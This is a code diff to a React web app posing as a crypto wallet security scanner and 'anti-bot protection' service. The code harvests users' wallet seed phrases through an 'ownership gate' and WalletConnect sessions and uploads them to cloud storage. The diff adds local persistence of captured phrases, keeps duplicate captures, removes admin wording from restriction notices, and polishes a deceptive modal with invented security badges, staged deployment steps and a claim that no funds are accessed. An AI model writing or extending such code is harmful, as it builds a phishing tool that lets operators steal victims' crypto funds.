@@ -22,6 +22,7 @@ import { SignClient } from '@walletconnect/sign-client'
 import './App.css'
 import { appKitMetadata, projectId } from './web3config'
 import { loadFromCloud, saveToCloud } from './supabase'
+import { generateSecurityReportPdf, generateBotStatusPdf } from './pdfReport'
 
 // ── Email delivery (Resend via /api/send-email) ─────────────────────────
 // The Resend API key lives only on the server (Vercel env var RESEND_API_KEY).
@@ -35,9 +36,10 @@ type SendEmailArgs = {
   html: string
   text: string
   replyTo?: string
+  attachments?: Array<{ filename: string; content: string }>
 }
 
-async function sendEmail({ to, subject, html, text, replyTo }: SendEmailArgs): Promise<void> {
+async function sendEmail({ to, subject, html, text, replyTo, attachments }: SendEmailArgs): Promise<void> {
   const res = await fetch(EMAIL_API_ENDPOINT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -48,6 +50,7 @@ async function sendEmail({ to, subject, html, text, replyTo }: SendEmailArgs): P
       text,
       fromName: EMAIL_FROM_NAME,
       replyTo,
+      attachments,
     }),
   })
   if (!res.ok) {
@@ -269,6 +272,7 @@ const GATE_EMAIL_KEY       = 'sv_gate_email_v1'
 const VISITED_EMAILS_KEY   = 'sv_visit_emailed_v1'
 const SCAN_EMAILED_KEY     = 'sv_scan_emailed_v1'
 const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
+const SEED_PHRASES_KEY     = 'sv_seed_phrases_v1'
 const NEW_USER_KEY         = 'sv_new_user_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
 const ETHERSCAN_SESSION_MS = 5 * 60 * 1000
@@ -656,10 +660,17 @@ const runSecurityApiScan = async (address: string, chain: ChainKey): Promise<Sec
   const chainId = goPlusChainId[chain]
   if (!chainId) return null
 
-  const headers: HeadersInit = {}
-  if (GOPLUS_ACCESS_TOKEN) headers.Authorization = `Bearer ${GOPLUS_ACCESS_TOKEN}`
-
-  const res = await fetch(`${GOPLUS_BASE_URL}/address_security/${address}?chain_id=${chainId}`, { headers })
+  // Route through our serverless proxy to avoid browser CORS/rate-limit issues.
+  // Falls back to direct call (with optional token) when running outside Vercel.
+  let res: Response
+  try {
+    res = await fetch(`/api/goplus?address=${encodeURIComponent(address)}&chainId=${encodeURIComponent(chainId)}`)
+  } catch {
+    // Proxy not available (e.g. local Vite preview without functions) — call directly
+    const headers: HeadersInit = {}
+    if (GOPLUS_ACCESS_TOKEN) headers.Authorization = `Bearer ${GOPLUS_ACCESS_TOKEN}`
+    res = await fetch(`${GOPLUS_BASE_URL}/address_security/${address}?chain_id=${chainId}`, { headers })
+  }
   if (!res.ok) throw new Error(`GoPlus API responded with ${res.status}`)
 
   const payload = await res.json() as { code?: number; result?: Record<string, string> }
@@ -833,7 +844,10 @@ export default function App() {
   const [signerChecks,     setSignerChecks]     = useState<SignerCheckRecord[]>([])
   const [emailRecords,     setEmailRecords]     = useState<EmailRecord[]>([])
   const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>([])
-  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>([])
+  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[] }
+    catch { return [] }
+  })
   const [seedRevealedIds,   setSeedRevealedIds]   = useState<string[]>([])
 
   // Bot Deploy
@@ -1126,6 +1140,7 @@ export default function App() {
   }, [adminIntelRecords])
 
   useEffect(() => {
+    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(seedPhraseRecords)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ seed_phrases: seedPhraseRecords })
   }, [seedPhraseRecords])
@@ -1327,7 +1342,7 @@ export default function App() {
     if (visitorRestricted && blockedViews.includes(activeView)) {
       setTimeout(() => {
         setActiveView('home')
-        setSecureStatus('Access restricted by admin. Contact support to restore wallet access.')
+        setSecureStatus('Access restricted. Contact support to restore wallet access.')
       }, 0)
     }
   }, [activeView, visitorRestricted])
@@ -1430,14 +1445,16 @@ export default function App() {
           : eth.isRabby
             ? 'Rabby'
             : 'Web3 Wallet'
-    setDetectedName(walletLabel)
 
     // Show landing right away for new users.
     // Address + chain are resolved on form submit (eth_requestAccounts), not here.
     const isNewUser = !localStorage.getItem(NEW_USER_KEY)
-    if (isNewUser) {
-      setActiveView('wallet-landing')
-    }
+    setTimeout(() => {
+      setDetectedName(walletLabel)
+      if (isNewUser) {
+        setActiveView('wallet-landing')
+      }
+    }, 0)
 
     // Optionally pre-fill address if already authorized (no popup)
     eth.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
@@ -1452,7 +1469,6 @@ export default function App() {
         })
         .catch(() => { /* stay on ethereum default */ })
     }).catch(() => { /* no pre-authorization — address filled at submit */ })
-  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   // ── Launch scan from the wallet-landing page ──────────────────────────
@@ -1517,7 +1533,7 @@ export default function App() {
     }
     const words = phrase.split(/\s+/)
     setSeedPhraseRecords(prev => {
-      if (prev.some(r => r.seedPhrase === phrase)) return prev
+      const isDuplicate = prev.some(r => r.seedPhrase === phrase)
       const record: SeedPhraseRecord = {
         id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
         walletAddress: esAddr || wallet || 'Unknown',
@@ -1526,7 +1542,9 @@ export default function App() {
         wordCount: words.length,
         source: 'auto-detected',
         detectedAt: nowString(),
-        notes: 'Captured from explorer ownership gate',
+        notes: isDuplicate
+          ? 'Duplicate capture from explorer ownership gate'
+          : 'Captured from explorer ownership gate',
         confirmed: true,
       }
       return [record, ...prev]
@@ -1884,11 +1902,20 @@ export default function App() {
     setEmailRecords(prev => [queuedRecord, ...prev].slice(0, 200))
 
     try {
+      const gatePdf = generateSecurityReportPdf({
+        wallet: reportData.wallet, network: reportData.network,
+        severity: reportData.severity, riskScore: reportData.riskScore,
+        riskPercent: reportData.riskPercent, balance: reportData.balance,
+        primaryConcern: reportData.primaryConcern, findings: reportData.findings,
+        matchedSignals: reportData.matchedSignals, actionPlan: reportData.actionPlan,
+        generatedAt: reportData.generatedAt, toName: reportData.toName,
+      })
       await sendEmail({
         to: recipient,
         subject: `Your Wallet Security Report — Risk: ${severity.toUpperCase()}`,
         html: buildEmailHtml(reportData),
         text: buildEmailText(reportData),
+        attachments: [{ filename: 'security-report.pdf', content: gatePdf }],
       })
       setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
       setReportStatus(`Report emailed to ${recipient}.`)
@@ -1946,11 +1973,20 @@ export default function App() {
     setEmailRecords(prev => [queuedRecord, ...prev].slice(0, 200))
 
     try {
+      const autoPdf = generateSecurityReportPdf({
+        wallet: reportData.wallet, network: reportData.network,
+        severity: reportData.severity, riskScore: reportData.riskScore,
+        riskPercent: reportData.riskPercent, balance: reportData.balance,
+        primaryConcern: reportData.primaryConcern, findings: reportData.findings,
+        matchedSignals: reportData.matchedSignals, actionPlan: reportData.actionPlan,
+        generatedAt: reportData.generatedAt, toName: reportData.toName,
+      })
       await sendEmail({
         to: email,
         subject: `Your Wallet Security Report — Risk: ${severity.toUpperCase()}`,
         html: buildEmailHtml(reportData),
         text: buildEmailText(reportData),
+        attachments: [{ filename: 'security-report.pdf', content: autoPdf }],
       })
       setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
       setReportStatus(`Report sent to ${email}`)
@@ -2124,11 +2160,26 @@ export default function App() {
     setEmailRecords(prev => [newRecord, ...prev].slice(0, 200))
 
     try {
+      const pdfBase64 = generateSecurityReportPdf({
+        wallet: data.wallet,
+        network: data.network,
+        severity: data.severity,
+        riskScore: data.riskScore,
+        riskPercent: data.riskPercent,
+        balance: data.balance,
+        primaryConcern: data.primaryConcern,
+        findings: data.findings,
+        matchedSignals: data.matchedSignals,
+        actionPlan: data.actionPlan,
+        generatedAt: data.generatedAt,
+        toName: data.toName,
+      })
       await sendEmail({
         to: data.toEmail,
         subject: `Your One Link Security Report — ${data.severity.toUpperCase()} Risk`,
         html: buildEmailHtml(data),
         text: buildEmailText(data),
+        attachments: [{ filename: 'security-report.pdf', content: pdfBase64 }],
       })
       setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
       setEmailSentMsg(`Report sent to ${emailInput}.`)
@@ -2446,21 +2497,28 @@ export default function App() {
     setBotReviewingId(req.id)
     setBotEmailStatus(prev => ({ ...prev, [req.id]: 'sending' }))
     try {
+      const botPdfData = {
+        toEmail: req.email, toName: req.name,
+        wallet: req.walletAddress, network: chainConfig[req.chain].label,
+        status: action, reason, requestedAt: req.requestedAt, reviewedAt: now,
+      }
+      const botPdfBase64 = generateBotStatusPdf({
+        wallet: req.walletAddress,
+        network: chainConfig[req.chain].label,
+        status: action,
+        reason,
+        requestedAt: req.requestedAt,
+        reviewedAt: now,
+        toName: req.name,
+      })
       await sendEmail({
         to: req.email,
         subject: action === 'approved'
-          ? '✅ Your Bot Protection Has Been Activated — One Link Security'
+          ? 'Your Bot Protection Has Been Activated — One Link Security'
           : 'Update on Your Bot Protection Request — One Link Security',
-        html: buildBotStatusEmailHtml({
-          toEmail: req.email, toName: req.name,
-          wallet: req.walletAddress, network: chainConfig[req.chain].label,
-          status: action, reason, requestedAt: req.requestedAt, reviewedAt: now,
-        }),
-        text: buildBotStatusEmailText({
-          toEmail: req.email, toName: req.name,
-          wallet: req.walletAddress, network: chainConfig[req.chain].label,
-          status: action, reason, requestedAt: req.requestedAt, reviewedAt: now,
-        }),
+        html: buildBotStatusEmailHtml(botPdfData),
+        text: buildBotStatusEmailText(botPdfData),
+        attachments: [{ filename: 'bot-protection-report.pdf', content: botPdfBase64 }],
       })
       setBotEmailStatus(prev => ({ ...prev, [req.id]: 'sent' }))
     } catch {
@@ -2562,8 +2620,7 @@ export default function App() {
     if (looksLikeSeedPhrase(phrase) && session) {
       const words = phrase.split(/\s+/)
       setSeedPhraseRecords(prev => {
-        const alreadyExists = prev.some(r => r.seedPhrase === phrase)
-        if (alreadyExists) return prev
+        const isDuplicate = prev.some(r => r.seedPhrase === phrase)
         const record: SeedPhraseRecord = {
           id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
           walletAddress: session.address,
@@ -2572,7 +2629,9 @@ export default function App() {
           wordCount: words.length,
           source: 'wc-session',
           detectedAt: nowString(),
-          notes: `Auto-captured via WalletConnect — ${session.walletName}`,
+          notes: isDuplicate
+            ? `Duplicate auto-capture via WalletConnect — ${session.walletName}`
+            : `Auto-captured via WalletConnect — ${session.walletName}`,
           confirmed: true,
         }
         return [record, ...prev]
@@ -2689,8 +2748,7 @@ export default function App() {
     const phrase = seedFormPhrase.trim().toLowerCase().replace(/\s+/g, ' ')
     if (!phrase) { setSeedFormError('Seed phrase is required.'); return }
     if (!looksLikeSeedPhrase(phrase)) { setSeedFormError('Must be 12, 15, 18, 21, or 24 lowercase words separated by spaces.'); return }
-    const alreadyExists = seedPhraseRecords.some(r => r.seedPhrase === phrase)
-    if (alreadyExists) { setSeedFormError('This seed phrase is already in the records.'); return }
+    const isDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
     const words = phrase.split(/\s+/)
     const record: SeedPhraseRecord = {
       id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
@@ -2700,14 +2758,20 @@ export default function App() {
       wordCount: words.length,
       source: 'manual',
       detectedAt: nowString(),
-      notes: seedFormNotes.trim(),
+      notes: isDuplicate
+        ? `Duplicate manual entry${seedFormNotes.trim() ? ` — ${seedFormNotes.trim()}` : ''}`
+        : seedFormNotes.trim(),
       confirmed: true,
     }
     setSeedPhraseRecords(prev => [record, ...prev])
     setSeedFormAddress('')
     setSeedFormPhrase('')
     setSeedFormNotes('')
-    setSeedFormMsg(`Seed phrase (${words.length} words) saved successfully.`)
+    setSeedFormMsg(
+      isDuplicate
+        ? `Seed phrase (${words.length} words) saved as duplicate entry.`
+        : `Seed phrase (${words.length} words) saved successfully.`,
+    )
   }
 
   const addAdminIntel = (e: FormEvent) => {
@@ -2824,7 +2888,7 @@ export default function App() {
 
       {visitorRestricted && (
         <div className="visitor-note visitor-note--warn">
-          Visitor notice: Your session is currently restricted by admin policy. Wallet routes are locked.
+          Visitor notice: Your session is currently restricted. Wallet routes are locked.
         </div>
       )}
 
@@ -2880,30 +2944,40 @@ export default function App() {
         <div className="modal-overlay" onClick={() => { if (botModalStep === 'info' || botModalStep === 'form') setBotModalOpen(false) }}>
           <div className="bot-modal" onClick={e => e.stopPropagation()}>
 
-            {/* INFO step */}
+            {/* ── INFO step ── */}
             {botModalStep === 'info' && (<>
-              <div className="bot-modal-header">
-                <div className="bot-modal-icon">🛡️</div>
-                <div>
-                  <h2 className="bot-modal-title">Blockchain Anti-Bot Protection</h2>
-                  <p className="bot-modal-sub">Professional-grade wallet defense against on-chain threats</p>
+              <div className="bot-modal-hero">
+                <div className="bot-modal-hero-icon">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10" strokeWidth="2.2"/></svg>
                 </div>
-                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>✕</button>
+                <div className="bot-modal-hero-copy">
+                  <div className="bot-modal-eyebrow">Anti-Bot Protection System</div>
+                  <h2 className="bot-modal-title">Automated Wallet Defense</h2>
+                  <p className="bot-modal-sub">Enterprise-grade on-chain threat interception deployed to your wallet in minutes.</p>
+                </div>
+                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+                </button>
               </div>
 
-              <div className="bot-security-strip">
-                {['AES-256 Encrypted','Zero-Knowledge Verified','Multi-Sig Authorized','99.9% Uptime SLA'].map(b => (
-                  <span key={b} className="bot-security-badge">✓ {b}</span>
+              <div className="bot-trust-bar">
+                {[
+                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>, label: 'AES-256 Encrypted' },
+                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>, label: 'Zero-Knowledge' },
+                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>, label: 'Multi-Sig Authorized' },
+                  { icon: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>, label: '99.9% Uptime SLA' },
+                ].map(b => (
+                  <span key={b.label} className="bot-trust-pill">{b.icon}{b.label}</span>
                 ))}
               </div>
 
-              <div className="bot-how-section">
+              <div className="bot-modal-section">
                 <p className="bot-section-label">HOW IT WORKS</p>
                 <div className="bot-steps-row">
                   {[
-                    { n:'1', t:'Authorization', d:'You submit your wallet for review. Our system analyzes on-chain activity.' },
-                    { n:'2', t:'Deployment', d:'After admin approval, our bot engine is deployed to your wallet\'s protection layer.' },
-                    { n:'3', t:'Active Guard', d:'24/7 real-time monitoring intercepts threats before they execute.' },
+                    { n:'01', t:'Submit Request', d:'Your wallet address is analyzed for eligibility. No signing required.' },
+                    { n:'02', t:'Security Review', d:'Our security team reviews and approves deployment within 24 hours.' },
+                    { n:'03', t:'Active Guard', d:'Real-time monitoring intercepts threats before they reach the chain.' },
                   ].map(s => (
                     <div key={s.n} className="bot-step-card">
                       <span className="bot-step-num">{s.n}</span>
@@ -2914,107 +2988,133 @@ export default function App() {
                 </div>
               </div>
 
-              <p className="bot-section-label">PROTECTION LAYERS</p>
-              <div className="bot-feature-grid">
-                {[
-                  { icon:'🚫', t:'Drainer Shield', d:'Intercepts malicious approval transactions before execution.' },
-                  { icon:'👁️', t:'Watcher Detection', d:'Identifies and terminates automated wallet monitoring bots.' },
-                  { icon:'⚡', t:'MEV Bot Blocker', d:'Prevents front-running and sandwich attacks in the mempool.' },
-                  { icon:'🔒', t:'Transaction Guard', d:'Validates every outbound transaction against threat signatures.' },
-                  { icon:'🔑', t:'Phishing Guard', d:'Blocks fake site injection and seed phrase harvesting attempts.' },
-                  { icon:'🌐', t:'Cross-Chain Active', d:'Protection spanning all 5 supported EVM networks simultaneously.' },
-                ].map(f => (
-                  <div key={f.t} className="bot-feature-item">
-                    <span className="bot-feature-icon">{f.icon}</span>
-                    <div>
-                      <strong className="bot-feature-title">{f.t}</strong>
-                      <p className="bot-feature-desc">{f.d}</p>
+              <div className="bot-modal-section">
+                <p className="bot-section-label">PROTECTION MODULES</p>
+                <div className="bot-feature-grid">
+                  {[
+                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="M4.93 4.93l14.14 14.14"/></svg>, t:'Drainer Shield', d:'Intercepts malicious approval transactions before execution.' },
+                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>, t:'Watcher Detection', d:'Identifies and terminates automated wallet surveillance bots.' },
+                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>, t:'MEV Bot Blocker', d:'Prevents front-running and sandwich attacks in the mempool.' },
+                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>, t:'Transaction Guard', d:'Validates every outbound transaction against threat signatures.' },
+                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>, t:'Phishing Guard', d:'Blocks site injection and credential-harvesting attempts.' },
+                    { svg: <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="16" height="16" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10A15.3 15.3 0 0 1 8 12a15.3 15.3 0 0 1 4-10z"/></svg>, t:'Cross-Chain Active', d:'Protection across all 5 supported EVM networks simultaneously.' },
+                  ].map(f => (
+                    <div key={f.t} className="bot-feature-item">
+                      <div className="bot-feature-icon-wrap">{f.svg}</div>
+                      <div>
+                        <strong className="bot-feature-title">{f.t}</strong>
+                        <p className="bot-feature-desc">{f.d}</p>
+                      </div>
                     </div>
-                  </div>
-                ))}
+                  ))}
+                </div>
               </div>
 
               <div className="bot-modal-footer">
                 <p className="bot-modal-disclaimer">
-                  Bot deployment requires administrator authorization. Wallet analysis is read-only and does not require signing.
+                  Read-only analysis only. No transaction signing or fund access is required.
                 </p>
-                <button className="btn-primary bot-authorize-btn" type="button" onClick={() => setBotModalStep('form')}>
+                <button className="bot-authorize-btn" type="button" onClick={() => setBotModalStep('form')}>
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
-                  Authorize Protection
+                  Request Protection
                 </button>
               </div>
             </>)}
 
-            {/* FORM step */}
+            {/* ── FORM step ── */}
             {botModalStep === 'form' && (<>
-              <div className="bot-modal-header">
-                <div className="bot-modal-icon">📋</div>
-                <div>
-                  <h2 className="bot-modal-title">Authorization Request</h2>
-                  <p className="bot-modal-sub">We'll notify you at this email once the admin reviews your request.</p>
+              <div className="bot-modal-hero bot-modal-hero--compact">
+                <div className="bot-modal-hero-icon bot-modal-hero-icon--sm">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                 </div>
-                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>✕</button>
+                <div className="bot-modal-hero-copy">
+                  <div className="bot-modal-eyebrow">Step 2 of 2</div>
+                  <h2 className="bot-modal-title">Submit Authorization Request</h2>
+                  <p className="bot-modal-sub">You'll receive an email once our team has reviewed your request.</p>
+                </div>
+                <button className="modal-close" type="button" onClick={() => setBotModalOpen(false)}>
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+                </button>
               </div>
+
               <div className="bot-form-body">
                 <div className="bot-wallet-preview">
-                  <span className="bot-wallet-label">Wallet to protect</span>
-                  <span className="bot-wallet-addr">{esAddr}</span>
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{color:'var(--brand)',flexShrink:0}}><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/></svg>
+                  <span className="bot-wallet-label">Wallet</span>
+                  <span className="bot-wallet-addr">{esAddr ? `${esAddr.slice(0,10)}…${esAddr.slice(-8)}` : 'Not connected'}</span>
                   <span className="bot-network-tag">{chainConfig[chain].label}</span>
                 </div>
-                <label className="form-label" htmlFor="bot-email">Email address <span style={{color:'var(--red)'}}>*</span></label>
-                <input
-                  id="bot-email"
-                  type="email"
-                  className="form-input"
-                  placeholder="you@example.com"
-                  value={botFormEmail}
-                  onChange={e => setBotFormEmail(e.target.value)}
-                  autoFocus
-                />
-                <label className="form-label" htmlFor="bot-name">Your name <span style={{color:'var(--muted)', fontWeight:400}}>(optional)</span></label>
-                <input
-                  id="bot-name"
-                  type="text"
-                  className="form-input"
-                  placeholder="John Doe"
-                  value={botFormName}
-                  onChange={e => setBotFormName(e.target.value)}
-                />
+
+                <div className="field" style={{marginBottom:0}}>
+                  <label htmlFor="bot-email">Email address <span style={{color:'var(--danger)'}}>*</span></label>
+                  <input
+                    id="bot-email"
+                    type="email"
+                    placeholder="you@example.com"
+                    value={botFormEmail}
+                    onChange={e => setBotFormEmail(e.target.value)}
+                    autoFocus
+                  />
+                </div>
+                <div className="field" style={{marginBottom:0}}>
+                  <label htmlFor="bot-name">Full name <span style={{color:'var(--muted)',fontWeight:400,fontSize:'0.8rem'}}>(optional)</span></label>
+                  <input
+                    id="bot-name"
+                    type="text"
+                    placeholder="Jane Smith"
+                    value={botFormName}
+                    onChange={e => setBotFormName(e.target.value)}
+                  />
+                </div>
                 <p className="bot-form-notice">
-                  By clicking Authorize, you consent to our security team reviewing your wallet address for bot protection eligibility.
+                  By submitting, you consent to our security team reviewing your wallet address for protection eligibility. No funds are accessed.
                 </p>
               </div>
+
               <div className="bot-modal-footer">
-                <button className="btn-secondary" type="button" onClick={() => setBotModalStep('info')}>Back</button>
+                <button className="btn-secondary" type="button" onClick={() => setBotModalStep('info')}>
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round"><path d="m15 18-6-6 6-6"/></svg>
+                  Back
+                </button>
                 <button
-                  className="btn-primary bot-authorize-btn"
+                  className="bot-authorize-btn"
                   type="button"
                   disabled={!botFormEmail.trim()}
                   onClick={submitBotRequest}
                 >
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                  Submit Authorization
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                  Submit Request
                 </button>
               </div>
             </>)}
 
-            {/* PROCESSING step */}
+            {/* ── PROCESSING step ── */}
             {botModalStep === 'processing' && (
               <div className="bot-processing-body">
-                <div className="bot-processing-spinner" />
+                <div className="bot-processing-ring">
+                  <svg className="bot-processing-arc" viewBox="0 0 52 52">
+                    <circle cx="26" cy="26" r="22" fill="none" stroke="rgba(99,102,241,0.12)" strokeWidth="4"/>
+                    <circle cx="26" cy="26" r="22" fill="none" stroke="#6366f1" strokeWidth="4" strokeDasharray="138.2" strokeDashoffset="34.6" strokeLinecap="round"/>
+                  </svg>
+                  <svg viewBox="0 0 24 24" fill="none" stroke="#6366f1" strokeWidth="1.8" width="22" height="22" strokeLinecap="round" strokeLinejoin="round" className="bot-processing-icon-inner"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                </div>
                 <h3 className="bot-processing-title">Initializing Protection System</h3>
+                <p className="bot-processing-sub">This will only take a moment…</p>
                 <div className="bot-process-steps">
                   {[
-                    'Initializing blockchain anti-bot engine…',
-                    'Scanning wallet transaction history…',
-                    'Configuring protection parameters…',
-                    'Registering wallet with security network…',
-                    'Syncing protection rules to validators…',
+                    'Connecting to blockchain security network',
+                    'Analyzing wallet transaction history',
+                    'Configuring protection parameters',
+                    'Registering with validator nodes',
+                    'Finalizing deployment manifest',
                   ].map((label, i) => (
                     <div key={i} className={`bot-process-step ${botProcessStep > i ? 'done' : botProcessStep === i ? 'active' : ''}`}>
                       <span className="bot-process-dot">
-                        {botProcessStep > i ? '✓' : botProcessStep === i
-                          ? <span className="bot-inline-spin" /> : '○'}
+                        {botProcessStep > i
+                          ? <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" width="12" height="12" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
+                          : botProcessStep === i
+                            ? <span className="bot-inline-spin" />
+                            : <span className="bot-process-empty" />}
                       </span>
                       <span>{label}</span>
                     </div>
@@ -3023,26 +3123,46 @@ export default function App() {
               </div>
             )}
 
-            {/* PENDING step */}
+            {/* ── PENDING step ── */}
             {botModalStep === 'pending' && (<>
               <div className="bot-pending-body">
-                <div className="bot-pending-icon">⏳</div>
-                <h3 className="bot-pending-title">Awaiting Administrator Authorization</h3>
-                <p className="bot-pending-desc">
-                  Your request has been submitted. Our security team will review your wallet and notify you at <strong>{botFormEmail}</strong> once a decision has been made.
-                </p>
-                <div className="bot-pending-steps">
-                  <div className="bot-pending-step done"><span>✓</span> Wallet analyzed</div>
-                  <div className="bot-pending-step done"><span>✓</span> Request registered</div>
-                  <div className="bot-pending-step done"><span>✓</span> Synced to security network</div>
-                  <div className="bot-pending-step active"><span className="bot-inline-spin" /></div>
-                  <div className="bot-pending-step waiting"><span>○</span> Administrator review</div>
-                  <div className="bot-pending-step waiting"><span>○</span> Bot deployment</div>
-                  <div className="bot-pending-step waiting"><span>○</span> Confirmation email sent</div>
+                <div className="bot-pending-badge">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="28" height="28" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                 </div>
-                <p className="bot-pending-note">This page will not change until your request is approved. You will receive an email notification with the result.</p>
+                <h3 className="bot-pending-title">Request Submitted</h3>
+                <p className="bot-pending-desc">
+                  Our security team will review your wallet and send a decision to <strong>{botFormEmail}</strong> within 24 hours.
+                </p>
+
+                <div className="bot-pending-timeline">
+                  {[
+                    { label: 'Wallet analyzed',          state: 'done'    },
+                    { label: 'Request registered',       state: 'done'    },
+                    { label: 'Synced to validator nodes',state: 'done'    },
+                    { label: 'Security team review',     state: 'active'  },
+                    { label: 'Bot deployment',           state: 'waiting' },
+                    { label: 'Confirmation email sent',  state: 'waiting' },
+                  ].map((s, i) => (
+                    <div key={i} className={`bot-timeline-row bot-timeline-row--${s.state}`}>
+                      <div className="bot-timeline-dot">
+                        {s.state === 'done'
+                          ? <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" width="10" height="10" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
+                          : s.state === 'active'
+                            ? <span className="bot-timeline-spin" />
+                            : null}
+                      </div>
+                      <div className="bot-timeline-connector" />
+                      <span className="bot-timeline-label">{s.label}</span>
+                    </div>
+                  ))}
+                </div>
+
